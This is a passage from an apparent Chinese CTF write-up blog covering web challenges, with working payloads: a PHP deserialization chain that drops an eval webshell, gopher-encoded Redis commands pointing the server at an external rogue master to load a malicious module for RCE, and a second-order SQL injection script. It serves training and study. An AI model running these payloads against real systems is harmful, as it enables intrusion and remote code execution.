language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">a</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">b</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="keyword">new</span> <span class="title function_ invoke__">a</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;?php @eval($_POST[&#x27;pass&#x27;]);</span></span><br><span class="line"><span class="comment"># O:1:&quot;b&quot;:2:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:1:&#123;s:4:&quot;code&quot;;s:90:&quot;fputs(fopen(&#x27;dotast.php&#x27;,&#x27;w&#x27;),base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUWydwYXNzJ10pOw==&quot;));&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$code</span> = <span class="string">&quot;eval(\$_POST[1]);&quot;</span>;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt; a=<span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$poc</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;A&quot;:1&#x27;</span>,<span class="string">&#x27;a&quot;:2&#x27;</span>,<span class="variable">$poc</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;?poc=&#x27;</span>.<span class="variable">$payload</span>;</span><br><span class="line"><span class="comment"># ?poc=O:1:&quot;B&quot;:1:&#123;s:1:&quot;a&quot;;O:1:&quot;a&quot;:2:&#123;s:4:&quot;code&quot;;s:16:&quot;eval($_POST[1]);&quot;;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>蚁剑连接，发现<code>.swp</code>文件为vim泄露，将其下载后改为<code>.config.php.swp</code>后恢复即可</p><p><img src="https://s2.loli.net/2024/05/01/oMR1FUEqI9hJ4kx.png" alt="343107e0c583fc38a9459f7e69eca23e"></p><p>无文件读取权限但又上传权限，在<code>/var/www/html</code>目录上传<code>exp.so</code>文件利用Redis主从复制漏洞RCE</p><p><code>MODULE LOAD /var/www/html/exp.so</code></p><p><code>system.exec &quot;cat /f*&quot;</code></p><p><strong>其他姿势</strong>：发现<code>disable_functions</code>后可用蚁剑插件打穿</p><p><img src="https://s2.loli.net/2024/05/02/9uyCbjT5M8VFOiz.png" alt="ee689f755b6726608ce3f59904918058"></p><h2 id="网鼎杯-2020-玄武组-ssrfme">[网鼎杯 2020 玄武组]SSRFMe</h2><p><a href="https://blog.csdn.net/m0_73512445/article/details/134740916">参考WP</a></p><p><strong>考点</strong>：<code>SSRF</code>、<code>Redis主从复制</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https|gopher|dict)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>];</span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>);</span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123;</span><br><span class="line">        <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Please visit hint.php locally.</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>存在一个<code>curl</code>的ssrf，但是存在<code>check_inner_ip</code>的限制</p><p><code>check_inner_ip</code>做了几件事：限制协议只能为http,https,gopher,dict、使用<code>parse_url</code>获取host、使用<code> gethostbyname</code>获取ip地址(防御了xip.io这类利用dns解析的绕过方法)、使用<code>ip2long</code>将ip地址转为整数，判断是否为内网网段(防御了<code>127.0.0.1/8</code>)</p><p>另外在发送请求后还对重定向的情况做了处理，获取请求信息，检查是否有重定向 URL。如果有，递归调用 <code>safe_request_url</code> 以处理重定向。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样基于跳转的方法也无法使用了</p><p><a href="https://liotree.github.io/2020/07/10/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E7%8E%84%E6%AD%A6%E7%BB%84-SSRFMe/#ssrf">一些SSRF绕过技巧</a></p><p>这里给出两种姿势<code>http://0.0.0.0/hint.php</code>、<code>http://[0:0:0:0:0:ffff:127.0.0.1]/hint.php</code></p><p>hint.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>],<span class="string">&quot;&lt;?php echo &#x27;redispass is root&#x27;;exit();&quot;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line">&#125; <span class="string">&quot;</span></span><br></pre></td></tr></table></figure><p>绕过写<code>shell</code>没有权限，不过给了Redis的密码<code>root</code>，可以打主从复制RCE</p><p>准备过程：将redis-rogue-server的exp.so文件复制到<code>Awsome-Redis-Rogue-Server</code>中，使用<code>Awsome-Redis-Rogue-Server</code>工具开启主服务，<a href="http://xn--soexp-uj1h2it7ce06d97f7zfq1bkwl7vj.so">并且恶意so文件指定为exp.so</a>，因为exp.so里面有system模块</p><p>开启主服务<code>python3 redis_rogue_server.py -v -path exp.so -lport 9000</code></p><p>然后就是gopher协议联动redies</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">config set dir /tmp/</span><br><span class="line">quit</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%252039.106.249.221%25209000%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 39.106.249.221 9000</span><br><span class="line">quit</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250amodule%2520load%2520./exp.so%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">module load ./exp.so</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">system.exec &quot;cat /flag&quot;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure><p>若靶机可出网也可采用反弹Shell方式</p><h2 id="网鼎杯-2018-unfinish">[网鼎杯 2018]unfinish</h2><p><strong>考点</strong>：<code>SQL二次注入</code></p><p>打开题目发现<code>/login.php</code>没有注入点，猜错或扫描可得到<code>register.php</code>，注册测试账号后自动跳转回登陆界面，登陆成功后<code>&lt;span class=&quot;user-name&quot;&gt;test1&lt;/span&gt; </code>用户名直接回显，猜测注册用户名处存在二次注入</p><p>用BP <code>FUZZ</code>一下发现过滤了<code>,</code>、<code>information_schema.tables</code>、<code>%0a</code>等</p><p>绕过方法：mysql中，+只能当做运算符，字母部分会被截断，与数字部分相加</p><p><img src="https://s2.loli.net/2024/05/03/dPwGQ6CXqRinxcW.png" alt="b8d8dfb709d277bd24afbf60e913de63"></p><p>由此可以逐位获得库名的<code>ascii</code>值，但因为过滤了<code>,</code>，我们用<code>from for</code>代替，类似 <code>substr(str from 1 for 10)</code>（表示截取str字符串的从第1个开始的10个字符），得到数据库名为<code>web</code>，由于过滤了<code>information_schema.tables</code>，得不到表名，根据网上的WP，只能猜表名为<code>flag</code>，写脚本即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://node4.anna.nssctf.cn:28710/&#x27;</span> <span class="comment"># 修改为靶机URL</span></span><br><span class="line">    url1 = url+<span class="string">&#x27;register.php&#x27;</span></span><br><span class="line">    url2 = url+<span class="string">&#x27;login.php&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        sleep(<span class="number">0.3</span>)</span><br><span class="line">        data1 = &#123;<span class="string">&quot;email&quot;</span> : <span class="string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;username&quot;</span> : <span class="string">&quot;0&#x27;+ascii(substr((select * from flag) from &#123;&#125; for 1))+&#x27;0;&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;password&quot;</span> : <span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">        data2 = &#123;<span class="string">&quot;email&quot;</span> : <span class="string">&quot;1234&#123;&#125;@123.com&quot;</span>.<span class="built_in">format</span>(i), <span class="string">&quot;password&quot;</span> : <span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">        r1 = requests.post(url1, data=data1)</span><br><span class="line">        r2 = requests.post(url2, data=data2)</span><br><span class="line">        res = re.search(<span class="string">r&#x27;&lt;span class=&quot;user-name&quot;&gt;\s*(\d*)\s*&lt;/span&gt;&#x27;</span>,r2.text)</span><br><span class="line">        res1 = re.search(<span class="string">r&#x27;\d+&#x27;</span>, res.group())</span><br><span class="line">        flag = flag+<span class="built_in">chr</span>(<span class="built_in">int</span>(res1.group()))</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;final:&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    search()</span><br><span class="line"><span class="comment"># NSSCTF&#123;515d99e2-bd44-4048-8797-26c9c5e57e45&#125;</span></span><br></pre></td></tr></table></figure><h2 id="tqlctf-2022-simple-bypass">[TQLCTF 2022]simple_bypass</h2><p><strong>考点</strong>：<code>代码审计</code>、<code>无数字字母RCE</code></p><p>RCE部分参考P牛的文章<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">一些不包含数字和字母的webshell</a></p><p>题目打开正常注册，登录寻找利用点，查看源代码搜索<code>php</code>发现</p><p><img src="https://s2.loli.net/2024/05/04/VO6TmEaeL1iCb3y.png" alt="1f67021bf1a49aea94ae792f1fcbcea4"></p><p>利用<code>../get_pic.php?image=img/haokangde.png</code>获取图片内容，猜测有任意文件读取漏洞，尝试路径穿越读<code>flag</code>失败，我们尝试读取一下登录界面源码</p><p><code>/get_pic.php?image=index.php</code>拿到<code>index.php</code>源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$hash_user</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line"><span class="variable">$hash_pass</span> = <span class="string">&#x27;zsf&#x27;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;pass&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]))&#123;</span><br><span class="line"><span class="comment">//filter</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) &gt; <span class="number">6</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Username is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) &gt; <span class="number">25</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Website is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]) &gt; <span class="number">1000</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Punctuation is too long!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\(\)\*&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\/\*:\.\;\(\)\n&lt;&gt;]/&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>]) === <span class="number">0</span>)&#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[a-z,A-Z,0-9&gt;\?]/&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>]);</span><br><span class="line"><span class="variable">$template</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__USER__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="variable">$template</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PASS__&quot;</span>, <span class="variable">$hash_pass</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__WEBSITE__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;website&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;__PUNC__&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;punctuation&#x27;</span>], <span class="variable">$content</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;sandbox/&#x27;</span>.<span class="variable">$hash_user</span>.<span class="string">&#x27;.php&#x27;</span>, <span class="variable">$content</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Successed!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in website!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;Invalid chars in username!&#x27;);&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;user&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;user&#x27;</span>], <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;pass&quot;</span>, <span class="variable">$hash_pass</span>, <span class="title function_ invoke__">time</span>()+<span class="number">3600</span>);</span><br><span class="line"><span class="title function_ invoke__">Header</span>(<span class="string">&quot;Location:sandbox/<span class="subst">$hash_user</span>.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>通过审计不难发现，该功能只是将输入的信息替换并插入模板文件<code>./template.html</code>中，因此我们再读取该文件</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="meta">error_reporting(0);</span></span><br><span class="line"><span class="meta">$user = ((string)__USER__);</span></span><br><span class="line"><span class="meta">$pass = ((string)__PASS__);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">if(isset($_COOKIE[&#x27;user&#x27;]) &amp;&amp; isset($_COOKIE[&#x27;pass&#x27;]) &amp;&amp; $_COOKIE[&#x27;user&#x27;] === $user 